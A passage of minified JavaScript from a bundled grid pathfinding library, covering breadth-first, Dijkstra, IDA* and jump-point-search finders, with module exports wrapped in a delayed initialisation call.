                                                    _.h = _.h || p * O(R(d - e), R(T - t)),
                                                    _.f = _.g + _.h,
                                                    _.parent = a,
                                                    _.opened ? l.updateItem(_) : (l.push(_),
                                                        _.opened = 2))
                                        }
                                }
                                return []
                            }
                                ,
                                t.exports = n
                        }
                            , {
                            "../core/DiagonalMovement": 3,
                            "../core/Heuristic": 5,
                            "../core/Util": 7,
                            heap: 1
                        }],
                        12: [function (e, t, i) {
                            function n(e) {
                                r.call(this, e);
                                var i = this.heuristic;
                                this.heuristic = function (e, t) {
                                    return 1e6 * i(e, t)
                                }
                            }
                            var r = e("./BiAStarFinder");
                            n.prototype = new r,
                                t.exports = n.prototype.constructor = n
                        }
                            , {
                            "./BiAStarFinder": 11
                        }],
                        13: [function (e, t, i) {
                            function n(e) {
                                this.allowDiagonal = (e = e || {}).allowDiagonal,
                                    this.dontCrossCorners = e.dontCrossCorners,
                                    this.diagonalMovement = e.diagonalMovement,
                                    this.diagonalMovement || (this.allowDiagonal ? this.dontCrossCorners ? this.diagonalMovement = r.OnlyWhenNoObstacles : this.diagonalMovement = r.IfAtMostOneObstacle : this.diagonalMovement = r.Never)
                            }
                            var A = e("../core/Util")
                                , r = e("../core/DiagonalMovement");
                            n.prototype.findPath = function (e, t, i, n, r) {
                                var o, a, s, _, E, e = r.getNodeAt(e, t), t = r.getNodeAt(i, n), u = [], d = [], T = this.diagonalMovement;
                                for (u.push(e),
                                    e.opened = !0,
                                    e.by = 0,
                                    d.push(t),
                                    t.opened = !0,
                                    t.by = 1; u.length && d.length;) {
                                    for ((s = u.shift()).closed = !0,
                                        _ = 0,
                                        E = (o = r.getNeighbors(s, T)).length; _ < E; ++_)
                                        if (!(a = o[_]).closed)
                                            if (a.opened) {
                                                if (1 === a.by)
                                                    return A.biBacktrace(s, a)
                                            } else
                                                u.push(a),
                                                    a.parent = s,
                                                    a.opened = !0,
                                                    a.by = 0;
                                    for ((s = d.shift()).closed = !0,
                                        _ = 0,
                                        E = (o = r.getNeighbors(s, T)).length; _ < E; ++_)
                                        if (!(a = o[_]).closed)
                                            if (a.opened) {
                                                if (0 === a.by)
                                                    return A.biBacktrace(a, s)
                                            } else
                                                d.push(a),
                                                    a.parent = s,
                                                    a.opened = !0,
                                                    a.by = 1
                                }
                                return []
                            }
                                ,
                                t.exports = n
                        }
                            , {
                            "../core/DiagonalMovement": 3,
                            "../core/Util": 7
                        }],
                        14: [function (e, t, i) {
                            function n(e) {
                                r.call(this, e),
                                    this.heuristic = function (e, t) {
                                        return 0
                                    }
                            }
                            var r = e("./BiAStarFinder");
                            n.prototype = new r,
                                t.exports = n.prototype.constructor = n
                        }
                            , {
                            "./BiAStarFinder": 11
                        }],
                        15: [function (e, t, i) {
                            function n(e) {
                                this.allowDiagonal = (e = e || {}).allowDiagonal,
                                    this.dontCrossCorners = e.dontCrossCorners,
                                    this.diagonalMovement = e.diagonalMovement,
                                    this.diagonalMovement || (this.allowDiagonal ? this.dontCrossCorners ? this.diagonalMovement = r.OnlyWhenNoObstacles : this.diagonalMovement = r.IfAtMostOneObstacle : this.diagonalMovement = r.Never)
                            }
                            var A = e("../core/Util")
                                , r = e("../core/DiagonalMovement");
                            n.prototype.findPath = function (e, t, i, n, r) {
                                var o, a, s, _, E, u = [], d = this.diagonalMovement, e = r.getNodeAt(e, t), T = r.getNodeAt(i, n);
                                for (u.push(e),
                                    e.opened = !0; u.length;) {
                                    if ((s = u.shift()).closed = !0,
                                        s === T)
                                        return A.backtrace(T);
                                    for (_ = 0,
                                        E = (o = r.getNeighbors(s, d)).length; _ < E; ++_)
                                        (a = o[_]).closed || a.opened || (u.push(a),
                                            a.opened = !0,
                                            a.parent = s)
                                }
                                return []
                            }
                                ,
                                t.exports = n
                        }
                            , {
                            "../core/DiagonalMovement": 3,
                            "../core/Util": 7
                        }],
                        16: [function (e, t, i) {
                            function n(e) {
                                r.call(this, e),
                                    this.heuristic = function (e, t) {
                                        return 0
                                    }
                            }
                            var r = e("./AStarFinder");
                            n.prototype = new r,
                                t.exports = n.prototype.constructor = n
                        }
                            , {
                            "./AStarFinder": 9
                        }],
                        17: [function (e, t, i) {
                            function n(e) {
                                this.allowDiagonal = (e = e || {}).allowDiagonal,
                                    this.dontCrossCorners = e.dontCrossCorners,
                                    this.diagonalMovement = e.diagonalMovement,
                                    this.heuristic = e.heuristic || r.manhattan,
                                    this.weight = e.weight || 1,
                                    this.trackRecursion = e.trackRecursion || !1,
                                    this.timeLimit = e.timeLimit || 1 / 0,
                                    this.diagonalMovement || (this.allowDiagonal ? this.dontCrossCorners ? this.diagonalMovement = o.OnlyWhenNoObstacles : this.diagonalMovement = o.IfAtMostOneObstacle : this.diagonalMovement = o.Never),
                                    this.diagonalMovement === o.Never ? this.heuristic = e.heuristic || r.manhattan : this.heuristic = e.heuristic || r.octile
                            }
                            e("../core/Util");
                            var r = e("../core/Heuristic")
                                , I = e("../core/Node")
                                , o = e("../core/DiagonalMovement");
                            n.prototype.findPath = function (e, t, i, n, d) {
                                for (var r, o, T = (new Date).getTime(), A = function (e, t) {
                                    return this.heuristic(Math.abs(t.x - e.x), Math.abs(t.y - e.y))
                                }
                                    .bind(this), h = function (e, t, i, n, r) {
                                        if (0 < this.timeLimit && (new Date).getTime() - T > 1e3 * this.timeLimit)
                                            return 1 / 0;
                                        var o = t + A(e, l) * this.weight;
                                        if (i < o)
                                            return o;
                                        if (e == l)
                                            return n[r] = [e.x, e.y],
                                                e;
                                        for (var a, s, _ = d.getNeighbors(e, this.diagonalMovement), E = 0, u = 1 / 0; s = _[E]; ++E) {
                                            if (this.trackRecursion && (s.retainCount = s.retainCount + 1 || 1,
                                                !0 !== s.tested) && (s.tested = !0),
                                                (a = h(s, t + (a = s,
                                                    e.x === a.x || e.y === a.y ? 1 : Math.SQRT2), i, n, r + 1)) instanceof I)
                                                return n[r] = [e.x, e.y],
                                                    a;
                                            this.trackRecursion && 0 == --s.retainCount && (s.tested = !1),
                                                a < u && (u = a)
                                        }
                                        return u
                                    }
                                        .bind(this), a = d.getNodeAt(e, t), l = d.getNodeAt(i, n), s = A(a, l); 1 / 0 !== (o = h(a, 0, s, r = [], 0));) {
                                    if (o instanceof I)
                                        return r;
                                    s = o
                                }
                                return []
                            }
                                ,
                                t.exports = n
                        }
                            , {
                            "../core/DiagonalMovement": 3,
                            "../core/Heuristic": 5,
                            "../core/Node": 6,
                            "../core/Util": 7
                        }],
                        18: [function (e, t, i) {
                            function n(e) {
                                r.call(this, e)
                            }
                            var r = e("./JumpPointFinderBase")
                                , d = e("../core/DiagonalMovement");
                            ((n.prototype = new r).constructor = n).prototype._jump = function (e, t, i, n) {
                                var r = this.grid
                                    , i = e - i
                                    , n = t - n;
                                if (!r.isWalkableAt(e, t))
                                    return null;
                                if (!0 === this.trackJumpRecursion && (r.getNodeAt(e, t).tested = !0),
                                    r.getNodeAt(e, t) === this.endNode)
                                    return [e, t];
                                if (0 != i && 0 != n) {
                                    if (r.isWalkableAt(e - i, t + n) && !r.isWalkableAt(e - i, t) || r.isWalkableAt(e + i, t - n) && !r.isWalkableAt(e, t - n) || this._jump(e + i, t, e, t) || this._jump(e, t + n, e, t))
                                        return [e, t]
                                } else if (0 != i) {
                                    if (r.isWalkableAt(e + i, t + 1) && !r.isWalkableAt(e, t + 1) || r.isWalkableAt(e + i, t - 1) && !r.isWalkableAt(e, t - 1))
                                        return [e, t]
                                } else if (r.isWalkableAt(e + 1, t + n) && !r.isWalkableAt(e + 1, t) || r.isWalkableAt(e - 1, t + n) && !r.isWalkableAt(e - 1, t))
                                    return [e, t];
                                return this._jump(e + i, t + n, e, t)
                            }
                                ,
                                n.prototype._findNeighbors = function (e) {
                                    var t, i, n, r, o, a = e.parent, s = e.x, _ = e.y, E = this.grid, u = [];
                                    if (a)
                                        t = a.x,
                                            a = a.y,
                                            t = (s - t) / Math.max(Math.abs(s - t), 1),
                                            a = (_ - a) / Math.max(Math.abs(_ - a), 1),
                                            0 != t && 0 != a ? (E.isWalkableAt(s, _ + a) && u.push([s, _ + a]),
                                                E.isWalkableAt(s + t, _) && u.push([s + t, _]),
                                                E.isWalkableAt(s + t, _ + a) && u.push([s + t, _ + a]),
                                                E.isWalkableAt(s - t, _) || u.push([s - t, _ + a]),
                                                E.isWalkableAt(s, _ - a) || u.push([s + t, _ - a])) : 0 == t ? (E.isWalkableAt(s, _ + a) && u.push([s, _ + a]),
                                                    E.isWalkableAt(s + 1, _) || u.push([s + 1, _ + a]),
                                                    E.isWalkableAt(s - 1, _) || u.push([s - 1, _ + a])) : (E.isWalkableAt(s + t, _) && u.push([s + t, _]),
                                                        E.isWalkableAt(s, _ + 1) || u.push([s + t, _ + 1]),
                                                        E.isWalkableAt(s, _ - 1) || u.push([s + t, _ - 1]));
                                    else
                                        for (r = 0,
                                            o = (i = E.getNeighbors(e, d.Always)).length; r < o; ++r)
                                            u.push([(n = i[r]).x, n.y]);
                                    return u
                                }
                                ,
                                t.exports = n
                        }
                            , {
                            "../core/DiagonalMovement": 3,
                            "./JumpPointFinderBase": 23
                        }],
                        19: [function (e, t, i) {
                            function n(e) {
                                r.call(this, e)
                            }
                            var r = e("./JumpPointFinderBase")
                                , d = e("../core/DiagonalMovement");
                            ((n.prototype = new r).constructor = n).prototype._jump = function (e, t, i, n) {
                                var r = this.grid
                                    , i = e - i
                                    , n = t - n;
                                if (!r.isWalkableAt(e, t))
                                    return null;
                                if (!0 === this.trackJumpRecursion && (r.getNodeAt(e, t).tested = !0),
                                    r.getNodeAt(e, t) === this.endNode)
                                    return [e, t];
                                if (0 != i && 0 != n) {
                                    if (r.isWalkableAt(e - i, t + n) && !r.isWalkableAt(e - i, t) || r.isWalkableAt(e + i, t - n) && !r.isWalkableAt(e, t - n) || this._jump(e + i, t, e, t) || this._jump(e, t + n, e, t))
                                        return [e, t]
                                } else if (0 != i) {
                                    if (r.isWalkableAt(e + i, t + 1) && !r.isWalkableAt(e, t + 1) || r.isWalkableAt(e + i, t - 1) && !r.isWalkableAt(e, t - 1))
                                        return [e, t]
                                } else if (r.isWalkableAt(e + 1, t + n) && !r.isWalkableAt(e + 1, t) || r.isWalkableAt(e - 1, t + n) && !r.isWalkableAt(e - 1, t))
                                    return [e, t];
                                return r.isWalkableAt(e + i, t) || r.isWalkableAt(e, t + n) ? this._jump(e + i, t + n, e, t) : null
                            }
                                ,
                                n.prototype._findNeighbors = function (e) {
                                    var t, i, n, r, o, a = e.parent, s = e.x, _ = e.y, E = this.grid, u = [];
                                    if (a)
                                        t = a.x,
                                            a = a.y,
                                            t = (s - t) / Math.max(Math.abs(s - t), 1),
                                            a = (_ - a) / Math.max(Math.abs(_ - a), 1),
                                            0 != t && 0 != a ? (E.isWalkableAt(s, _ + a) && u.push([s, _ + a]),
                                                E.isWalkableAt(s + t, _) && u.push([s + t, _]),
                                                (E.isWalkableAt(s, _ + a) || E.isWalkableAt(s + t, _)) && u.push([s + t, _ + a]),
                                                !E.isWalkableAt(s - t, _) && E.isWalkableAt(s, _ + a) && u.push([s - t, _ + a]),
                                                !E.isWalkableAt(s, _ - a) && E.isWalkableAt(s + t, _) && u.push([s + t, _ - a])) : 0 == t ? E.isWalkableAt(s, _ + a) && (u.push([s, _ + a]),
                                                    E.isWalkableAt(s + 1, _) || u.push([s + 1, _ + a]),
                                                    E.isWalkableAt(s - 1, _) || u.push([s - 1, _ + a])) : E.isWalkableAt(s + t, _) && (u.push([s + t, _]),
                                                        E.isWalkableAt(s, _ + 1) || u.push([s + t, _ + 1]),
                                                        E.isWalkableAt(s, _ - 1) || u.push([s + t, _ - 1]));
                                    else
                                        for (r = 0,
                                            o = (i = E.getNeighbors(e, d.IfAtMostOneObstacle)).length; r < o; ++r)
                                            u.push([(n = i[r]).x, n.y]);
                                    return u
                                }
                                ,
                                t.exports = n
                        }
                            , {
                            "../core/DiagonalMovement": 3,
                            "./JumpPointFinderBase": 23
                        }],
                        20: [function (e, t, i) {
                            function n(e) {
                                r.call(this, e)
                            }
                            var r = e("./JumpPointFinderBase")
                                , h = e("../core/DiagonalMovement");
                            ((n.prototype = new r).constructor = n).prototype._jump = function (e, t, i, n) {
                                var r = this.grid
                                    , i = e - i
                                    , n = t - n;
                                if (!r.isWalkableAt(e, t))
                                    return null;
                                if (!0 === this.trackJumpRecursion && (r.getNodeAt(e, t).tested = !0),
                                    r.getNodeAt(e, t) === this.endNode)
                                    return [e, t];
                                if (0 != i && 0 != n) {
                                    if (this._jump(e + i, t, e, t) || this._jump(e, t + n, e, t))
                                        return [e, t]
                                } else if (0 != i) {
                                    if (r.isWalkableAt(e, t - 1) && !r.isWalkableAt(e - i, t - 1) || r.isWalkableAt(e, t + 1) && !r.isWalkableAt(e - i, t + 1))
                                        return [e, t]
                                } else if (0 != n && (r.isWalkableAt(e - 1, t) && !r.isWalkableAt(e - 1, t - n) || r.isWalkableAt(e + 1, t) && !r.isWalkableAt(e + 1, t - n)))
                                    return [e, t];
                                return r.isWalkableAt(e + i, t) && r.isWalkableAt(e, t + n) ? this._jump(e + i, t + n, e, t) : null
                            }
                                ,
                                n.prototype._findNeighbors = function (e) {
                                    var t, i, n, r, o = e.parent, a = e.x, s = e.y, _ = this.grid, E = [];
                                    if (o) {
                                        var u, d, T, A = o.x, o = o.y, A = (a - A) / Math.max(Math.abs(a - A), 1), o = (s - o) / Math.max(Math.abs(s - o), 1);
                                        0 != A && 0 != o ? (_.isWalkableAt(a, s + o) && E.push([a, s + o]),
                                            _.isWalkableAt(a + A, s) && E.push([a + A, s]),
                                            _.isWalkableAt(a, s + o) && _.isWalkableAt(a + A, s) && E.push([a + A, s + o])) : 0 != A ? (u = _.isWalkableAt(a + A, s),
                                                T = _.isWalkableAt(a, s + 1),
                                                d = _.isWalkableAt(a, s - 1),
                                                u && (E.push([a + A, s]),
                                                    T && E.push([a + A, s + 1]),
                                                    d) && E.push([a + A, s - 1]),
                                                T && E.push([a, s + 1]),
                                                d && E.push([a, s - 1])) : 0 != o && (u = _.isWalkableAt(a, s + o),
                                                    A = _.isWalkableAt(a + 1, s),
                                                    T = _.isWalkableAt(a - 1, s),
                                                    u && (E.push([a, s + o]),
                                                        A && E.push([a + 1, s + o]),
                                                        T) && E.push([a - 1, s + o]),
                                                    A && E.push([a + 1, s]),
                                                    T) && E.push([a - 1, s])
                                    } else
                                        for (n = 0,
                                            r = (t = _.getNeighbors(e, h.OnlyWhenNoObstacles)).length; n < r; ++n)
                                            i = t[n],
                                                E.push([i.x, i.y]);
                                    return E
                                }
                                ,
                                t.exports = n
                        }
                            , {
                            "../core/DiagonalMovement": 3,
                            "./JumpPointFinderBase": 23
                        }],
                        21: [function (e, t, i) {
                            function n(e) {
                                r.call(this, e)
                            }
                            var r = e("./JumpPointFinderBase")
                                , d = e("../core/DiagonalMovement");
                            ((n.prototype = new r).constructor = n).prototype._jump = function (e, t, i, n) {
                                var r = this.grid
                                    , i = e - i
                                    , n = t - n;
                                if (!r.isWalkableAt(e, t))
                                    return null;
                                if (!0 === this.trackJumpRecursion && (r.getNodeAt(e, t).tested = !0),
                                    r.getNodeAt(e, t) === this.endNode)
                                    return [e, t];
                                if (0 != i) {
                                    if (r.isWalkableAt(e, t - 1) && !r.isWalkableAt(e - i, t - 1) || r.isWalkableAt(e, t + 1) && !r.isWalkableAt(e - i, t + 1))
                                        return [e, t]
                                } else {
                                    if (0 == n)
                                        throw Error("Only horizontal and vertical movements are allowed");
                                    if (r.isWalkableAt(e - 1, t) && !r.isWalkableAt(e - 1, t - n) || r.isWalkableAt(e + 1, t) && !r.isWalkableAt(e + 1, t - n) || this._jump(e + 1, t, e, t) || this._jump(e - 1, t, e, t))
                                        return [e, t]
                                }
                                return this._jump(e + i, t + n, e, t)
                            }
                                ,
                                n.prototype._findNeighbors = function (e) {
                                    var t, i, n, r, o, a = e.parent, s = e.x, _ = e.y, E = this.grid, u = [];
                                    if (a)
                                        t = a.x,
                                            a = a.y,
                                            t = (s - t) / Math.max(Math.abs(s - t), 1),
                                            a = (_ - a) / Math.max(Math.abs(_ - a), 1),
                                            0 != t ? (E.isWalkableAt(s, _ - 1) && u.push([s, _ - 1]),
                                                E.isWalkableAt(s, _ + 1) && u.push([s, _ + 1]),
                                                E.isWalkableAt(s + t, _) && u.push([s + t, _])) : 0 != a && (E.isWalkableAt(s - 1, _) && u.push([s - 1, _]),
                                                    E.isWalkableAt(s + 1, _) && u.push([s + 1, _]),
                                                    E.isWalkableAt(s, _ + a)) && u.push([s, _ + a]);
                                    else
                                        for (r = 0,
                                            o = (i = E.getNeighbors(e, d.Never)).length; r < o; ++r)
                                            u.push([(n = i[r]).x, n.y]);
                                    return u
                                }
                                ,
                                t.exports = n
                        }
                            , {
                            "../core/DiagonalMovement": 3,
                            "./JumpPointFinderBase": 23
                        }],
                        22: [function (e, t, i) {
                            var n = e("../core/DiagonalMovement")
                                , r = e("./JPFNeverMoveDiagonally")
                                , o = e("./JPFAlwaysMoveDiagonally")
                                , a = e("./JPFMoveDiagonallyIfNoObstacles")
                                , s = e("./JPFMoveDiagonallyIfAtMostOneObstacle");
                            t.exports = function (e) {
                                return new ((e = e || {}).diagonalMovement === n.Never ? r : e.diagonalMovement === n.Always ? o : e.diagonalMovement === n.OnlyWhenNoObstacles ? a : s)(e)
                            }
                        }
                            , {
                            "../core/DiagonalMovement": 3,
                            "./JPFAlwaysMoveDiagonally": 18,
                            "./JPFMoveDiagonallyIfAtMostOneObstacle": 19,
                            "./JPFMoveDiagonallyIfNoObstacles": 20,
                            "./JPFNeverMoveDiagonally": 21
                        }],
                        23: [function (e, t, i) {
                            function n(e) {
                                this.heuristic = (e = e || {}).heuristic || I.manhattan,
                                    this.trackJumpRecursion = e.trackJumpRecursion || !1
                            }
                            var _ = e("heap")
                                , E = e("../core/Util")
                                , I = e("../core/Heuristic");
                            e("../core/DiagonalMovement"),
                                n.prototype.findPath = function (e, t, i, n, r) {
                                    var o, a = this.openList = new _(function (e, t) {
                                        return e.f - t.f
                                    }
                                    ), e = this.startNode = r.getNodeAt(e, t), s = this.endNode = r.getNodeAt(i, n);
                                    for (this.grid = r,
                                        e.g = 0,
                                        e.f = 0,
                                        a.push(e),
                                        e.opened = !0; !a.empty();) {
                                        if ((o = a.pop()).closed = !0,
                                            o === s)
                                            return E.expandPath(E.backtrace(s));
                                        this._identifySuccessors(o)
                                    }
                                    return []
                                }
                                ,
                                n.prototype._identifySuccessors = function (e) {
                                    for (var t, i, n, r, o, a = this.grid, s = this.heuristic, _ = this.openList, E = this.endNode.x, u = this.endNode.y, d = e.x, T = e.y, A = Math.abs, h = 0, l = (t = this._findNeighbors(e)).length; h < l; ++h)
                                        if (n = t[h],
                                            n = this._jump(n[0], n[1], d, T)) {
                                            if (i = n[0],
                                                n = n[1],
                                                (o = a.getNodeAt(i, n)).closed)
                                                continue;
                                            r = I.octile(A(i - d), A(n - T)),
                                                r = e.g + r,
                                                (!o.opened || r < o.g) && (o.g = r,
                                                    o.h = o.h || s(A(i - E), A(n - u)),
                                                    o.f = o.g + o.h,
                                                    o.parent = e,
                                                    o.opened ? _.updateItem(o) : (_.push(o),
                                                        o.opened = !0))
                                        }
                                }
                                ,
                                t.exports = n
                        }
                            , {
                            "../core/DiagonalMovement": 3,
                            "../core/Heuristic": 5,
                            "../core/Util": 7,
                            heap: 1
                        }]
                    }, {}, [8])(8)
                }
                ,
                "object" == typeof exports ? module.exports = ee() : "function" == typeof define && define.amd ? define(ee) : ("undefined" != typeof window ? Io = window : "undefined" != typeof global ? Io = global : "undefined" != typeof self && (Io = self),
                    Io.PF = ee())
        }
            , 1e3);
